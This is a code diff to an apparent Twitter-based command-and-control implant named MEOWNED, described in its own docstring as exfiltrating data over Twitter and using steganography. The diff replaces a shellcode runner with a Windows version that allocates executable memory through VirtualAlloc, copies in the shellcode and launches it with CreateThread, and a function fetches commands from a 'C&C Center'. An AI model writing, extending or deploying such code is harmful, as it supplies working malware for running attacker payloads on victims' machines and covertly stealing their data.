@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/python
 """MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
 """pip3 install python-twitter"""
 """pip3 install Stegano"""
@@ -59,18 +59,29 @@ def get_secret(image):
 def search_hashtag(cc_hastag):
     return api.GetSearch(term = cc_hastag)
 
-def run_shellcode(shellcode_base64):
+def run_shellcode(shellcode_str):
     # decode the shellcode from base64 
-    shellcode = base64.b64decode(shellcode_base64)
-
-    # create a buffer in memory
-    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
-
-    # create a function pointer to our shellcode
-    shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
-
-    # call our shellcode
-    shellcode_func()
+    shellcode = bytearray(shellcode_str)
+    
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                            ctypes.c_int(len(shellcode)),
+                                            ctypes.c_int(0x3000),
+                                            ctypes.c_int(0x40))
+    
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+    
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                        buf,
+                                        ctypes.c_int(len(shellcode)))
+    
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(ptr),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.pointer(ctypes.c_int(0)))
+    
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 def get_last_cmd():
     # Get the last command from C&C Center
